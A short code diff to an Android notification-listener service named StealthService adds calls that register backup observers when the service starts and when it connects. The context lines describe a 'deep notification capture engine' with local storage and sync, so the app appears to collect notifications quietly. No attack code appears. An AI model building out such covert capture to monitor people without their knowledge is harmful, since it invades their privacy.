@@ -19,6 +19,7 @@ import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
+import com.notrack.stealth.backup.BackupObserverService;
 import com.notrack.stealth.db.AppDatabase;
 import com.notrack.stealth.db.NotificationEntity;
 import com.notrack.stealth.security.EncryptionUtils;
@@ -126,6 +127,7 @@ public class StealthService extends NotificationListenerService {
         sInstance = this;
         warmupDedupCache();
         registerNetworkCallback();
+        BackupObserverService.registerObservers(this);
         Log.i(TAG, "Enterprise StealthService initialized with deep notification capture engine.");
     }
 
@@ -163,6 +165,7 @@ public class StealthService extends NotificationListenerService {
         sInstance = this;
         Log.i(TAG, "Notification Listener connected.");
         warmupDedupCache();
+        BackupObserverService.registerObservers(this);
         processActiveNotifications();
         triggerAsyncSync();
     }
